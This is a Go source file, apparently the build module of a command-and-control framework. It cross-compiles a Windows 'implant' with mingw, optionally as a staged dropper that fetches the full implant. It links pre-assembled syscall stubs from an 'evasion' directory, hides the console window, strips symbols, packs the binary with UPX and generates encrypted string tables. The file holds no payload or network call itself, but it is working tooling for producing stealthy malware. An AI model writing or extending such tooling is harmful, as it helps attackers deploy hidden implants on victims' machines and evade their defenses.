package compiler

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
)

// CompileOptions controls the cross-compilation process
type CompileOptions struct {
	// Source paths
	ImplantDir string // path to implant/ source tree
	BuildDir   string // temporary build directory
	OutputPath string // final PE output path

	// Toolchain
	Arch       string // "x64" or "x86"
	StripSymbols bool
	StaticLink  bool

	// Build mode
	Staged bool // build staged dropper instead of full implant

	// Post-processing
	UPXPack bool // compress with UPX after build
}

// CompileResult holds the outcome
type CompileResult struct {
	OutputPath string
	Size       int64
	Arch       string
}

// CrossCompile builds the implant using mingw cross-compiler
// Expects x86_64-w64-mingw32-gcc on PATH
func CrossCompile(opts CompileOptions) (*CompileResult, error) {
	// determine compiler
	var cc string
	switch opts.Arch {
	case "x64", "":
		cc = "x86_64-w64-mingw32-gcc"
		opts.Arch = "x64"
	case "x86":
		cc = "i686-w64-mingw32-gcc"
	default:
		return nil, fmt.Errorf("unsupported arch: %s", opts.Arch)
	}

	// verify compiler exists
	if _, err := exec.LookPath(cc); err != nil {
		return nil, fmt.Errorf("cross-compiler not found: %s (install mingw-w64)", cc)
	}

	// collect source files
	var sources []string
	var srcErr error
	if opts.Staged {
		sources, srcErr = collectStagedSources(opts.ImplantDir)
	} else {
		sources, srcErr = collectSources(opts.ImplantDir)
	}
	if srcErr != nil {
		return nil, fmt.Errorf("collect sources: %w", srcErr)
	}

	if len(sources) == 0 {
		return nil, fmt.Errorf("no .c source files found in %s", opts.ImplantDir)
	}

	// collect pre-assembled object files (.o) from the evasion directory
	objFiles, _ := collectObjectFiles(opts.ImplantDir)

	// build command
	args := []string{
		"-o", opts.OutputPath,
		"-I", filepath.Join(opts.ImplantDir, "src"),
		"-Os",       // optimize for size
		"-DNDEBUG",
		"-DWIN32",
		"-D_WINDOWS",
		"-mwindows", // no console window
	}

	if opts.StripSymbols {
		args = append(args, "-s")
	}

	if opts.StaticLink {
		args = append(args, "-static")
	}

	// add source files
	args = append(args, sources...)

	// add pre-assembled object files (syscall stubs, etc.)
	args = append(args, objFiles...)

	// link libraries (order matters for mingw)
	args = append(args,
		"-lwinhttp",
		"-lbcrypt",
		"-liphlpapi",
		"-ladvapi32",
		"-lws2_32",
		"-lntdll",
	)

	// on Linux/Mac host, use mingw's CRT
	if runtime.GOOS != "windows" {
		args = append(args, "-Wl,--subsystem,windows")
	}

	fmt.Printf("[build] compiling with %s (%d source files, %d object files)\n", cc, len(sources), len(objFiles))
	fmt.Printf("[build] target: %s\n", opts.Arch)

	cmd := exec.Command(cc, args...)
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr

	if err := cmd.Run(); err != nil {
		return nil, fmt.Errorf("compilation failed: %w", err)
	}

	// post-process: UPX compression
	if opts.UPXPack {
		if err := upxPack(opts.OutputPath); err != nil {
			fmt.Printf("[build] WARNING: UPX packing failed: %v\n", err)
			// non-fatal, continue with uncompressed binary
		}
	}

	// get output size
	info, err := os.Stat(opts.OutputPath)
	if err != nil {
		return nil, fmt.Errorf("stat output: %w", err)
	}

	return &CompileResult{
		OutputPath: opts.OutputPath,
		Size:       info.Size(),
		Arch:       opts.Arch,
	}, nil
}

// collectSources finds all .c files in the implant source tree (full build)
func collectSources(implantDir string) ([]string, error) {
	var sources []string
	srcDir := filepath.Join(implantDir, "src")

	err := filepath.Walk(srcDir, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return err
		}
		if !info.IsDir() && strings.HasSuffix(path, ".c") {
			// exclude staged dropper source from full build
			if strings.Contains(path, string(filepath.Separator)+"staged"+string(filepath.Separator)) {
				return nil
			}
			sources = append(sources, path)
		}
		return nil
	})

	return sources, err
}

// collectStagedSources finds only the .c files needed for the staged dropper:
// staged/staged.c + evasion layer + crypto (AES decrypt)
// Excludes the full implant's main.c, comms/, commands/ (those come from the fetched PE)
func collectStagedSources(implantDir string) ([]string, error) {
	srcDir := filepath.Join(implantDir, "src")

	// explicitly list the subdirectories the staged dropper needs
	includeDirs := []string{
		filepath.Join(srcDir, "staged"),
		filepath.Join(srcDir, "evasion"),
		filepath.Join(srcDir, "crypto"),
	}

	var sources []string
	for _, dir := range includeDirs {
		err := filepath.Walk(dir, func(path string, info os.FileInfo, err error) error {
			if err != nil {
				return err
			}
			if !info.IsDir() && strings.HasSuffix(path, ".c") {
				sources = append(sources, path)
			}
			return nil
		})
		if err != nil {
			return nil, err
		}
	}

	return sources, nil
}

// collectObjectFiles finds pre-assembled .o files in the evasion directory
// These are produced by NasmAssemble (syscall stubs, etc.) before CrossCompile runs
func collectObjectFiles(implantDir string) ([]string, error) {
	evasionDir := filepath.Join(implantDir, "src", "evasion")
	var objs []string

	entries, err := os.ReadDir(evasionDir)
	if err != nil {
		return nil, err
	}

	for _, e := range entries {
		if !e.IsDir() && strings.HasSuffix(e.Name(), ".o") {
			objs = append(objs, filepath.Join(evasionDir, e.Name()))
		}
	}

	return objs, nil
}

// upxPack compresses the PE with UPX
func upxPack(path string) error {
	upx, err := exec.LookPath("upx")
	if err != nil {
		return fmt.Errorf("UPX not found on PATH")
	}

	cmd := exec.Command(upx, "--best", "--lzma", path)
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr

	return cmd.Run()
}

// RunPythonScript executes a Python script and writes its stdout to outputPath.
// Used for build-time code generation (encrypted string tables, etc.)
func RunPythonScript(scriptPath, outputPath string) error {
	python, err := exec.LookPath("python3")
	if err != nil {
		python, err = exec.LookPath("python")
		if err != nil {
			return fmt.Errorf("python not found on PATH")
		}
	}

	cmd := exec.Command(python, scriptPath)
	out, err := cmd.Output()
	if err != nil {
		if exitErr, ok := err.(*exec.ExitError); ok {
			return fmt.Errorf("script failed: %s", string(exitErr.Stderr))
		}
		return fmt.Errorf("script failed: %w", err)
	}

	if err := os.MkdirAll(filepath.Dir(outputPath), 0755); err != nil {
		return fmt.Errorf("create output dir: %w", err)
	}

	if err := os.WriteFile(outputPath, out, 0644); err != nil {
		return fmt.Errorf("write output: %w", err)
	}

	fmt.Printf("[build] generated %s (%d bytes)\n", outputPath, len(out))
	return nil
}

// NasmAssemble compiles MASM-style .asm to .o for linking
// Uses nasm on Linux hosts with -f win64
func NasmAssemble(asmPath, objPath, arch string) error {
	nasm, err := exec.LookPath("nasm")
	if err != nil {
		return fmt.Errorf("nasm not found on PATH")
	}

	format := "win64"
	if arch == "x86" {
		format = "win32"
	}

	cmd := exec.Command(nasm, "-f", format, "-o", objPath, asmPath)
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr

	return cmd.Run()
}
